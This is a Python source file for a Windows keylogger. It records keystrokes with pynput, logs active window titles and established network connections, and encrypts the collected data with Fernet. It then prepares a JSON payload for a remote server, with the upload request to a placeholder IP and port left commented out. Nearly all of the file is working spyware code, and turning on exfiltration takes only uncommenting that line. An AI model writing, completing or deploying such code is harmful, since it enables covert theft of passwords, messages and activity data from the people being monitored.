# Imports for functionality - keyboard logging, encryption, networking, etc.
from pynput import keyboard
import requests
import json
import psutil
import win32gui
from cryptography.fernet import Fernet
import time

# Encryption key - in a real scenario, you’d store this securely somewhere
encryption_key = Fernet.generate_key()
cipher = Fernet(encryption_key)

# Globals to keep logs temporarily - cleared after each interval
text = ""
network_data = []
active_windows = []
log_interval = 10  # Time interval in seconds for periodic logging

# Placeholder values for server details - commented out to disable network functionality
ip_address = "xxx.xxx.xxx.xxx"  # Replace with actual IP if needed
port_number = "xxxx"            # Replace with actual port if needed

# Function to encrypt data - makes it secure if we ever need to send or store it
def encrypt_data(data):
    return cipher.encrypt(data.encode())

# Get the title of the currently active window - shows the app in use
def log_active_window():
    window = win32gui.GetForegroundWindow()
    return win32gui.GetWindowText(window)

# Capture active network connections - only established ones
def log_network_activity():
    connections = psutil.net_connections(kind='inet')
    return [
        {"laddr": conn.laddr, "raddr": conn.raddr, "status": conn.status}
        for conn in connections if conn.status == psutil.CONN_ESTABLISHED
    ]

# Capture keystrokes and store in `text` - handle special keys as needed
def on_press(key):
    global text
    try:
        if key == keyboard.Key.enter:
            text += "\n"
        elif key == keyboard.Key.space:
            text += " "
        elif hasattr(key, 'char'):
            text += key.char  # Add character to log
    except AttributeError:
        # Non-character keys can be skipped here
        pass

# Optional function to send logs to a server - currently inactive
def send_to_server():
    payload = json.dumps({
        "keyboardData": encrypt_data(text).decode(),
        "networkData": encrypt_data(json.dumps(network_data)).decode(),
        "activeWindows": encrypt_data(json.dumps(active_windows)).decode()
    })
    # Placeholder for server POST request - uncomment to enable
    # requests.post(f"http://{ip_address}:{port_number}", data=payload, headers={"Content-Type": "application/json"})
    print("Data prepared for server (not actually sent).")

# Main function to handle logging
def main():
    global text, network_data, active_windows
    
    with keyboard.Listener(on_press=on_press) as listener:
        while True:
            time.sleep(log_interval)  # Wait for the set interval

            # Capture current active window and network status
            current_window = log_active_window()
            network_data = log_network_activity()

            # Append and display the logs in the console
            active_windows.append(current_window)
            print(f"Active Window: {current_window}")
            print(f"Network Connections: {network_data}")

            # Display captured keystrokes
            print("Keystrokes:", text)
            send_to_server()  # Send logs if enabled
            
            # Clear keystrokes after logging
            text = ""

        listener.join()  # Keep listener active

# Run the main function if the script is executed directly
if __name__ == "__main__":
    main()
